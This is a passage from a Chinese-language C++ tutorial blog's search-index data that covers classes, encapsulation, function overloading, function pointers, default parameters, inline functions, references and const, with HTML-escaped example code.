类名::类方法(函数形参) 12345678910111213141516171819202122#include \"Circle.h\"double Circle::getArea() &#123; m_area = 3.14 * m_R * m_R; return m_area;&#125;double Circle::getGirth() &#123; m_girth = 2 * 3.14 * m_R; return m_girth;&#125;double Circle::getR() &#123; return m_R;&#125;void Circle::setR(double r)&#123; m_R = r;&#125; main.cpp 使用Circle类需要引用类头文件#include&quot;Circle.h&quot; 1234567891011121314#include&lt;iostream&gt;#include\"Circle.h\"using namespace std;int main(int argc, char* argv[])&#123; Circle c; c.setR(10.0); cout &lt;&lt; c.getArea() &lt;&lt; endl; cout &lt;&lt; c.getGirth() &lt;&lt; endl; cout &lt;&lt; c.getR() &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类的封装","slug":"cpp0017-类的封装","date":"2021-04-24T20:24:57.000Z","updated":"2021-04-24T20:37:46.221Z","comments":true,"path":"2021/04/25/cpp0017-类的封装/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/25/cpp0017-类的封装/","excerpt":"","text":"类的封装 面向对象有三大特点， 封装，继承，多态 C++将struct 做了功能的增强，struct实际上就是一个class 只不过struct的类的内部，默认的访问控制权限是public class 的类的内部，默认的访问控制权限是private 输入年月日,并判断是否是闰年 封装前 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;struct Date&#123; int year; int month; int day;&#125;;//初始化这个结构体void init(struct Date &amp; date)&#123; cout &lt;&lt; \"year, month, day\" &lt;&lt; endl; cin &gt;&gt; date.year; cin &gt;&gt; date.month; cin &gt;&gt; date.day;&#125;//打印此结构体void printDate(struct Date &amp;date)&#123; cout &lt;&lt; \"日期是\" &lt;&lt; date.year &lt;&lt; \"年\" &lt;&lt; date.month &lt;&lt; \"月\" &lt;&lt; date.day &lt;&lt; \"日\" &lt;&lt; endl;&#125;//判断是否为闰年bool isLeapYear(struct Date &amp;date)&#123; if (((date.year % 4 == 0) &amp;&amp; (date.year % 100 != 0)) || (date.year % 400 == 0)) &#123; return true; &#125; else &#123; return false; &#125;&#125;void test1()&#123; struct Date date; //传统的C语言开发，面向过程的， 是一个一个函数来操作， C语种最小单元是一个函数 init(date); printDate(date); if (isLeapYear(date) == true) &#123; cout &lt;&lt; \"是闰年\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"不是闰年\" &lt;&lt; endl; &#125;&#125;int main()&#123; test1(); return 0;&#125; 封装后 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class MyDate&#123; //类的&#123;&#125;中的所有区域称为 类的 内部， 除了&#123;&#125;区域以外都是 类的外部public://访问控制权限 //在public标识符下面定义的成员变量和成员函数 均可以在类的外部和类的内部 访问 int getYear() &#123; return year; &#125; void init() &#123; cout &lt;&lt; \"year, month, day\" &lt;&lt; endl; cin &gt;&gt; year; cin &gt;&gt; month; cin &gt;&gt; day; &#125; //成员函数 bool isLeapYear() &#123; if (((year % 4 == 0) &amp;&amp; (year % 100 != 0)) || (year % 400 == 0)) &#123; return true; &#125; else &#123; return false; &#125; &#125; void printDate() &#123; cout &lt;&lt; \"日期是\" &lt;&lt; year &lt;&lt; \"年\" &lt;&lt; month &lt;&lt; \"月\" &lt;&lt; day &lt;&lt; \"日\" &lt;&lt; endl; &#125;protected://如果是单个类， 跟private是一样的。 在类的内部能够访问，在类的外部不能够访问private://在private 访问控制符 下定义的成员变量和成员函数 只能在类的内部访问 int month; int day; int year;&#125;;void test2()&#123; MyDate date; //通过MyDate 类 实例化一个对象 //c++中 是面向对象进行开发，所有方法都封装在类中， 通过一个一个的对象进行编程。 date.init(); if (date.isLeapYear() == true) &#123; cout &lt;&lt; \"是闰年\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"不是闰年\" &lt;&lt; endl; &#125; //cout &lt;&lt;\"年\"&lt;&lt; date.year &lt;&lt; endl; cout &lt;&lt; \"年\" &lt;&lt; date.getYear() &lt;&lt; endl; /* date.year = 2005;//在类的外部修改了成员变量 date.month; date.day; */&#125;int main(void)&#123; //test1(); test2(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类的基本概念","slug":"cpp0016-类的基本概念","date":"2021-04-24T20:01:19.000Z","updated":"2021-04-24T20:27:25.793Z","comments":true,"path":"2021/04/25/cpp0016-类的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/25/cpp0016-类的基本概念/","excerpt":"","text":"类的基本概念 类的定义 123class className&#123;类成员变量或方法&#125;; 类方法可以直接调用类成员变量或方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;iostream&gt;using namespace std;class Animal &#123;public: char name[64]; char color[64]; void run() &#123; cout &lt;&lt; name &lt;&lt; \"跑起来了\" &lt;&lt; endl; &#125; void write() &#123; cout &lt;&lt; name &lt;&lt; \"写字了\" &lt;&lt; endl; &#125; void print() &#123; cout &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; color &lt;&lt; endl; &#125;private: int id;&#125;;int main(int argc, char* argv[])&#123; Animal dog, cat; strcpy(dog.color, \"yellow\"); strcpy(dog.name, \"xiaoming\"); strcpy(cat.name, \"xiaohua\"); strcpy(cat.color, \"black\"); dog.print(); cat.print(); dog.run(); dog.write(); cat.run(); cat.write(); return 0;&#125; public 公有的,类的外部可以直接调用 private私有的,类的外部不可以直接调用,可以通过方法get或set protected保护的,在类的外部调用不到,子类可以调用","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数重载","slug":"cpp0014-函数重载","date":"2021-04-22T16:12:36.000Z","updated":"2021-04-22T16:38:09.512Z","comments":true,"path":"2021/04/23/cpp0014-函数重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/23/cpp0014-函数重载/","excerpt":"","text":"函数重载 函数重载(Function Overload)：用同一个函数名定义不同的函数，当函 数名和不同的参数搭配时函数的含义不同。 重载规则 1,函数名相同。 2,参数个数不同,参数的类型不同,参数顺序不同,均可构成重载。 3,返回值类型不影响重载。 调用准则 1,严格匹配,找到则调用。 2,通过隐式转换寻求一个匹配,找到则调用。 编译器调用重载函数的准则: 1.将所有同名函数作为候选者 2.尝试寻找可行的候选函数 3.精确匹配实参 4.通过默认参数能够匹配实参 5.通过默认类型转换匹配实参 6.匹配失败 7.最终寻找到的可行候选函数不唯一，则出现二义性，编译失败。 8.无法匹配所有候选者，函数未定义，编译失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//决定一个函数的 1 返回值， 2 参数列表void func(int a)//void (*fp)(int)&#123; cout &lt;&lt; \"func1 \" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;//函数重载 是对一种函数的 添加的 意义， 对一个函数名 添加多中不同的实现 （+）//函数重载， 就是对参数列表的 变换不是 函数返回值的变化//返回值必须一样，参数列表不同， 并且函数名 相同的函数 都是重载函数//void func(int a, int b = 10)void func(int a, int b )&#123; cout &lt;&lt; \"func2\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; \",\" &lt;&lt;b &lt;&lt; endl;&#125;//如果函数 完全相同 也不是一个函数重载/*void func(int a, int b)&#123;&#125;*/void func(int a, int b, char *str)&#123; cout &lt;&lt; \"func3\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; \", \" &lt;&lt; b &lt;&lt; \", \" &lt;&lt; str &lt;&lt; endl;&#125;//返回值类型不同，不能构成重载/*char func()&#123;&#125;*/void print(double a)&#123; cout &lt;&lt; \"print double \" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;void print(float a)&#123; cout &lt;&lt;\"print float\" &lt;&lt;endl; cout &lt;&lt;a &lt;&lt;endl;&#125;#if 0void print(int a)&#123; cout &lt;&lt; \"print int\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;void print(char a)&#123; cout &lt;&lt; \"print char\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;#endifint main(void)&#123; //定义一个 指向void func(int a)的函数指针 //void(*fp)(int) = func;//fp 就是执行 void()(int) 这种函数类型的指针 //fp(10); func(10); //编译器 会根据用户传递的参数类型和个数 进行重载函数的匹配 //如果说函数重载 加上了默认参数， 回导致调用函数的时候出现二义性， //记住： 函数重载 最好不要有默认参数， func(10, 20); func(10, 20, \"abc\"); //print(10); //void print(int a) //print(1.1);//void print(double a) //print(1.1f); // 经过隐式转换 会调用void print(double a) //print('a'); //经过隐式转化， 'a' -&gt;int void print(int a) //print(\"asbdasd\"); //1 严格进行参数列表匹配 //2 如果隐式转换可以找到匹配 那么依然可以调用 //3 如果匹配不到， 直接报错。 return 0;&#125; 重载底层实现（name mangling） C++利用 name mangling(倾轧)技术,来改名函数名,区分参数不同的同 名函数。 实现原理:用 v c i f l d表示 void char int float long double 及其引 用。 12void func(char a); // func_c(char a)void func(char a,int b,double c); //func_cid(char a,int b,double c);","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数重载和函数指针","slug":"cpp0015-函数重载和函数指针","date":"2021-04-22T16:12:36.000Z","updated":"2021-04-22T17:49:33.840Z","comments":true,"path":"2021/04/23/cpp0015-函数重载和函数指针/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/23/cpp0015-函数重载和函数指针/","excerpt":"","text":"函数重载和函数指针 函数重载与函数指针 当使⽤用重载函数名对函数指针进⾏行赋值时 根据重载规则挑选与函数指针参数列表⼀一致的候选者 严格匹配候选者的函数类型与函数指针的函数类型 函数指针，调用的时候是不能够发生函数重载的 函数指针基本语法 123456789101112int func(int a, int b,int c)&#123; cout &lt;&lt; \"func2\" &lt;&lt; endl; return 0;&#125;//第一种函数指针定义typedef int (My_func)(int, int);//第二种函数指针定义typedef int(*My_func2)(int, int);//第三种函数指针定义int(*fp3)(int, int) = func; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;void func(int a, int b)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl;&#125;void func(int a, int b, int c)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; c &lt;&lt; endl;&#125;void func(int a, int b, int c, int d)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; c &lt;&lt;d &lt;&lt; endl;&#125;//1 定义一个函数类型typedef void(myfunctype)(int, int); //定义了一个函数类型， 返回值void 参数列表是 int，int ,, void()(int,int)//2 定义一个函数指针类型 typedef void(*myfunctype_pointer)(int, int); //定义了一个函数指针类型， 返回值void 参数列表是 int，int ,, void(*)(int,int)int main(void)&#123; //1 定义一个函数指针 myfunctype * fp1 = NULL; fp1 = func; fp1(10, 20); // 2 定义一个函数指针 myfunctype_pointer fp2 = NULL; fp2 = func; fp2(10, 20); //3 直接定义一个函数指针 void(*fp3)(int, int) = NULL; fp3 = func; fp3(10, 20); cout &lt;&lt; \" -----------------\" &lt;&lt; endl; //此时的fp3 是 void(*)(int,int) //fp3(10, 30, 30); //fp3 恒定指向一个 函数入口，void func(int, int) 的函数入口 //fp3(10, 30, 40, 50); //想要通过函数指针，发生函数重载 是不可能。 fp3(10, 20); void(*fp4)(int, int, int) = func; //在堆函数指针赋值的时候，函数指针会根据自己的类型 找到一个重载函数 fp4(10, 10, 10); //fp4(10, 10, 10, 10); //函数指针，调用的时候是不能够发生函数重载的。 void(*fp5)(int, int, int, int) = func;// void func(int ,int ,int ,int ) fp5(10, 10, 10, 10); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数的默认参数和占位参数","slug":"cpp0013-函数的默认参数和占位参数","date":"2021-04-22T15:48:32.000Z","updated":"2021-04-22T16:12:03.183Z","comments":true,"path":"2021/04/22/cpp0013-函数的默认参数和占位参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0013-函数的默认参数和占位参数/","excerpt":"","text":"函数的默认参数和占位参数 默认参数规则 只有参数列表后面部分的参数才可以提供默认参数值 一旦在一个函数调用中开始使用默认参数值，那么这个参数后的所有参 数都必须使用默认参数值 123456789101112131415161718192021#include&lt;iostream&gt;using namespace std;int qiuLiFangTiTiJi(int l = 10, int w = 20, int h = 10)&#123; return l * w * h;&#125;int main(int argc, char* argv[])&#123; int l = 10; int w = 20; int h = 30; cout &lt;&lt; qiuLiFangTiTiJi() &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l) &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l, w) &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l, w, h) &lt;&lt; endl; return 0;&#125; 占位参数 函数占位参数 占位参数只有参数类型声明，⽽而没有参数名声明 一般情况下，在函数体内部⽆无法使⽤用占位参数 12345678910111213141516171819#include&lt;iostream&gt;using namespace std;int max(int a, int b, int)&#123; return a &gt; b ? a : b;&#125;int max2(int a, int b, float = 0)&#123; return a &gt; b ? a : b;&#125;int main(int argc, char* argv[])&#123; cout &lt;&lt; max(10, 20, 30) &lt;&lt; endl; cout &lt;&lt; max2(410,330) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"内联函数","slug":"cpp0012-内联函数","date":"2021-04-22T15:30:23.000Z","updated":"2021-04-22T15:47:32.185Z","comments":true,"path":"2021/04/22/cpp0012-内联函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0012-内联函数/","excerpt":"","text":"内联函数 c 语言中有宏函数的概念。宏函数的特点是内嵌到调用代码中去,避免了 函数调用 的开销。但是由于宏函数的处理发生在预处理阶段,缺失了语法检测 和有可能带来的语意差错 特点： 1）内联函数声明时inline关键字必须和函数定义结合在一起，否则编译器会直 接忽略内联请求。 2）C编译器直接将函数体插入在函数调用的地方 。 3）内联函数没有普通函数调用时的额外开销(压栈，跳转，返回)。 4）内联函数是一种特殊的函数，具有普通函数的特征（参数检查，返回类型 等）。 5） 内联函数由 编译器处理，直接将编译后的函数体插入调用的地方， 宏代码片段 由预处理器处理， 进行简单的文本替换，没有任何编译过程。 6）C中内联编译的限制： 不能存在任何形式的循环语句 不能存在过多的条件判断语句 函数体不能过于庞大 不能对函数进行取址操作 函数内联声明必须在调用语句之前 7）编译器对于内联函数的限制并不是绝对的，内联函数相对于普通函数的优 势只是省去了函数调用时压栈，跳转和返回的开销。因此，当函数体的执行开 销远大于压栈，跳转和返回所用的开销时，那么内联将无意义。 12345678910111213141516171819#include&lt;iostream&gt;using namespace std;//内联函数inline int Max(int a, int b)&#123; return a &gt; b ? a : b;&#125;int main(int argc, char* argv[])&#123; int a = 100; int b = 20; int max = Max(a, b); cout &lt;&lt; max &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"const引用","slug":"cpp0011-const引用","date":"2021-04-22T15:26:26.000Z","updated":"2021-04-26T15:48:11.367Z","comments":true,"path":"2021/04/22/cpp0011-const引用/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0011-const引用/","excerpt":"","text":"const引用 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//const引用一般用在形参上，来限制 被引用的变量不能被修改，void printX(const int &amp; re )&#123; cout &lt;&lt; \"re \" &lt;&lt; re &lt;&lt; endl;&#125;int main(void)&#123; const int a = 10; // a必须初始化 //int &amp; b = a; const int &amp;b = a; //如果是一个const 常量， 必须用const 引用来接收它 int x = 3.14; const int &amp;re1 = x; cout &lt;&lt; \"re1 \" &lt;&lt; re1 &lt;&lt; endl; x = 20; cout &lt;&lt; \"re1 \" &lt;&lt; re1 &lt;&lt; \", x: \" &lt;&lt; x &lt;&lt; endl; const int &amp;re2 = 10;// 用const 引用 引用一个字面量 // 当用一个const 引用 去引用一个字面量的时候， 字面量他是没有地址， //引用是无法 对字面量取地址的， 临时创建一个 int temp， 10 ---&gt;temp //const int &amp;re2 = temp; //用re2 就是代表 temp，re2是const的引用，你无法去改变temp的值 //int &amp;re2 = 10; //非常量引用 必须是左值。 左值就是可以放在=左边的表达式，左值是可以赋值，是有内存空间的 //如果想对一个字面量做引用的话，只能用 const 的引用 cout &lt;&lt; \"re2 = \" &lt;&lt; re2 &lt;&lt; endl; cout &lt;&lt; \"sizeof(re2)\" &lt;&lt; sizeof(re2) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"指针引用","slug":"cpp0010-指针引用","date":"2021-04-22T15:15:14.000Z","updated":"2021-04-22T15:19:03.507Z","comments":true,"path":"2021/04/22/cpp0010-指针引用/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0010-指针引用/","excerpt":"","text":"指针引用 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;#include&lt;cstdlib&gt;using namespace std;int my_malloc(int num,int **pp)&#123; *pp = (int *)malloc(num); return 0;&#125;//指针引用做函数参数,优化二级指针int my_malloc2(int num, int * &amp;pp)//pp 代表 *pp&#123; pp = (int *)malloc(num); return 0;&#125;int main(int argc, char* argv[])&#123; int *p = NULL; my_malloc(100, &amp;p); cout &lt;&lt; p &lt;&lt; endl; free(p); p = NULL; cout &lt;&lt; \"------------------------------------\" &lt;&lt; endl; my_malloc2(4, p); *p = 4; cout &lt;&lt; *p &lt;&lt; endl; free(p); p = NULL; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"引用的本质","slug":"cpp0009-引用的本质","date":"2021-04-22T14:28:42.000Z","updated":"2021-04-22T14:32:32.798Z","comments":true,"path":"2021/04/22/cpp0009-引用的本质/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0009-引用的本质/","excerpt":"","text":"引用的本质 在研究引用的时候 ，可以将引用理解为 一个 常指针 在理解引用的时候， 可以将引用理解为 一个变量的别名 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;struct TypeA&#123; int *a;&#125;;struct TypeB&#123; double &amp;a;&#125;;struct Teacher&#123; int id; char name[64];&#125;;void motifyTeacher(Teacher &amp;t) //&#123; t.id = 100; // 如果说t是一个常指针， *t 就是指针指向内存空间 (*t).id = 100 //当你要试图修改或者获取已经初始化的引用的时候， 编译器会有一个隐藏的*的操作&#125;void motifyA(int *const a) //常指针 也是一个常量， 也是必须要初始化， 也不能被修改&#123; *a = 100;&#125;void motifyB(int &amp;a)&#123; a = 1000; //a 实际上是一个常量指针， 但是如果你给一个a赋值，编译器会有一个隐形的操作， *&#125;//在研究引用的时候 ，可以将引用理解为 一个 常指针//在理解引用的时候， 可以将引用理解为 一个变量的别名void test()&#123; int value = 20; Teacher t1 = &#123; 1, \"zhangsan\" &#125;; motifyA(&amp;value); cout &lt;&lt; \"value = \" &lt;&lt; value &lt;&lt; endl; motifyB(value); // int value --&gt; int &amp;a , int&amp; a = value 给引用指定指向哪个变量的时候， 编译器提供又有了一个隐形的操作 // a = &amp;value; cout &lt;&lt; \"value = \" &lt;&lt; value &lt;&lt; endl; motifyTeacher(t1); //如果说 motifyTeacher 的形参是一个常指针，Teacher *const t = &amp;t1; //编译器发现 Teacher &amp;t 形参是一个引用， Teacher &amp;t = &amp;t1; //当给引用初始化的时候， 会有一个&amp; 的隐形操作&#125;void motifyAA(int *a)&#123; *a = 100; //间接的赋值&#125;void motifyBB(int &amp;a) //int &amp;a = a; a = &amp;a;&#123; a = 200; //*a = 200&#125;void test2()&#123; int a = 10; //条件一 motifyAA(&amp;a); //int*a = &amp;a; //建立了关联 motifyBB(a);&#125;int main(void)&#123; int a = 10; int b = 20; const int c_a = 10; //c_a = 20;//常量在初始化之后，不能够再修改了 int &amp;re = a; //引用必须初始化. 引用在初始化之后，也不能够被改变 re = b; // a = b 而不是 让re引用指向b cout &lt;&lt; \"re = \" &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; re = 100; //是该的a 还是b？ cout &lt;&lt; \"re = \" &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; //1 引用 可能是一个 常量？ cout &lt;&lt; \"sizeof(TypeA): \" &lt;&lt; sizeof(TypeA) &lt;&lt; endl; cout &lt;&lt; \"sizeof(TypeB):\" &lt;&lt; sizeof(TypeB) &lt;&lt; endl; //通过对引用求大小， 发现不管引用是什么类型 都是4个字节，都跟指针的大小一样。 //2 引用可能是一个 指针？ test(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"引用的基本概念","slug":"cpp0008-引用的基本概念","date":"2021-04-22T13:35:32.000Z","updated":"2021-04-22T19:44:07.552Z","comments":true,"path":"2021/04/22/cpp0008-引用的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0008-引用的基本概念/","excerpt":"","text":"引用的基本概念 给变量起别名 规则 1 引用没有定义,是一种关系型声明。声明它和原有某一变量(实体)的关 系。故 而类型与原类型保持一致,且不分配内存。与被引用的变量有相同的地 址。 123456789101112131415#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; int &amp; re = a; cout &lt;&lt; \"&amp;a = \" &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; \"&amp;re = \" &lt;&lt; &amp;re &lt;&lt; endl; return 0;&#125; 2 声明的时候必须初始化,一经声明,不可变更。 12345678910111213#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; //int &amp;re; //Error int &amp;re = a; cout &lt;&lt; re &lt;&lt; endl; return 0;&#125; 3 可对引用,再次引用。多次引用的结果,是某一变量具有多个别名。 123456789101112131415161718#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; //int &amp;re; //Error int &amp;re = a; int &amp;re2 = re; cout &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; re2 &lt;&lt; endl; cout &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; &amp;re &lt;&lt; endl; cout &lt;&lt; &amp;re2 &lt;&lt; endl; return 0;&#125; 4 &amp;符号前有数据类型时,是引用。其它皆为取地址。 引用做函数参数或函数返回值 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include&lt;iostream&gt;using namespace std;typedef struct student&#123; char name[50]; float score; int sex;&#125;Student;//交换两个变量的值int my_swap(int &amp;a, int &amp;b)&#123; int tem = a; a = b; b = tem; return 0;&#125;//打印结构体变量Student &amp; my_print(Student &amp;a)&#123; cout &lt;&lt; a.name &lt;&lt; endl; cout &lt;&lt; a.score &lt;&lt; endl; cout &lt;&lt; a.sex &lt;&lt; endl; return a;&#125;int main(int argc, char* argv[])&#123; Student XiaoMing = &#123; \"XiaoMing\",100.0f,1 &#125;; int a = 100, b = 90; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"--------------------------------\" &lt;&lt; endl; my_swap(a, b); my_print(XiaoMing); cout &lt;&lt; \"--------------------------------\" &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"枚举的增强","slug":"cpp0007-枚举的增强","date":"2021-04-15T15:10:03.000Z","updated":"2021-04-15T15:11:30.054Z","comments":true,"path":"2021/04/15/cpp0007-枚举的增强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0007-枚举的增强/","excerpt":"","text":"枚举的增强 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;enum Son &#123; xiaom, xiaoh, xiaol, xiaolan,&#125;;int main(int argc, char* argv[])&#123; //可以省略enum关键字不写 Son house = xiaom; //c++中,枚举变量只能用枚举常量来赋值 //house = 1; cout &lt;&lt; house &lt;&lt; endl; cin.get(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"const的增强","slug":"cpp0006-const的增强","date":"2021-04-15T14:19:28.000Z","updated":"2021-04-26T15:48:41.832Z","comments":true,"path":"2021/04/15/cpp0006-const的增强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0006-const的增强/","excerpt":"","text":"const的增强 const int * a表示指针指向的内存空间不可以修改 int * const a表示不能修改a的指向 const int * const a 表示a的内存和a所指向的内存都不可以修改 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; //在c语言中a是一个假常量,c++中a是一个真的常量,只不过在编译阶段完成,而不是预处理阶段 const int a = 100; //创建一个临时变量的地址赋值给p1,所以修改*p1时,a不会改变 int * p1 = (int *)&amp;a; //c++中const修饰过的整型变量可以声明数组,c语言不可以 int array[a] = &#123; 0 &#125;; *p1 = 1; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"*p1 = \" &lt;&lt; *p1 &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"三目运算符的加强","slug":"cpp0005-三目运算符的加强","date":"2021-04-14T17:53:25.000Z","updated":"2021-04-15T14:18:49.107Z","comments":true,"path":"2021/04/15/cpp0005-三目运算符的加强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0005-三目运算符的加强/","excerpt":"","text":"三目运算符的加强 1234567891011121314151617181920#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a, b; a = 10; b = 20; //三目运算符可以用作左值,返回的是a或b的引用 //c语言则不行,除非这样写(a &gt; b ? &amp;a : &amp;b) = 100; (a &gt; b ? a : b) = 100; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; cin.get(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"C++语言对C的增强和bool","slug":"cpp0004-C-语言对C的增强和bool","date":"2021-04-14T17:53:25.000Z","updated":"2021-04-14T18:31:06.706Z","comments":true,"path":"2021/04/15/cpp0004-C-语言对C的增强和bool/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0004-C-语言对C的增强和bool/","excerpt":"","text":"C++语言对C的增强和bool 变量定义 c语言:早期版本中规定要定义在函数首部 c++:在函数内随便一个位置都可以 c对定义全局变量的检测能力增强了,c语言在同一个地方可以定义多次重名的全局变量,c不可以. 123456789101112131415161718192021#include&lt;stdio.h&gt;int g_a;int g_a = 2;/*c语言会处理成:int g_a;g_a = 2;*/int main(int argc, char* argv[])&#123; return 0;&#125; struct的类型增强 C++定义struct变量时可以不用加struct关键字 1234567891011121314#include&lt;iostream&gt;using namespace std;struct student &#123; float score;&#125;;int main(int argc, char* argv[])&#123; //可以不用加struct关键字 student xiaoming; return 0;&#125; C++不可以没有函数类型,c语言可以没有函数类型,默认是int C++填写函数参数必须是对应个数,C语言可以不对应 12345678910111213141516171819#include&lt;stdio.h&gt;//c语言可以没有函数类型,默认为intfun()&#123; return 0;&#125;fun1(int a) &#123; return 0;&#125;int main(int argc, char* argv[])&#123; //传入过多的参数,c语言也不会出错 fun1(1,2,3,4,5,61,2); return 0;&#125; C++引入了bool类型来表示true和false 1234567891011121314#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; bool flag = true; cout &lt;&lt; (bool)flag &lt;&lt; endl; cout &lt;&lt; sizeof(flag) &lt;&lt; endl; cout &lt;&lt; (flag = 100) &lt;&lt; endl; cout &lt;&lt; (flag = 0) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"自定义命名空间","slug":"cpp0003-自定义命名空间","date":"2021-04-14T17:37:03.000Z","updated":"2021-04-14T18:29:54.500Z","comments":true,"path":"2021/04/15/cpp0003-自定义命名空间/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0003-自定义命名空间/","excerpt":"","text":"自定义命名空间 12345678910/*语法:namespace 自定义命名空间名&#123;内容&#125;*/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;iostream&gt;using namespace std;namespace xiaochenyanA &#123; int a;&#125;namespace xiaochenyanB &#123; int a; //可以嵌套定义命名空间 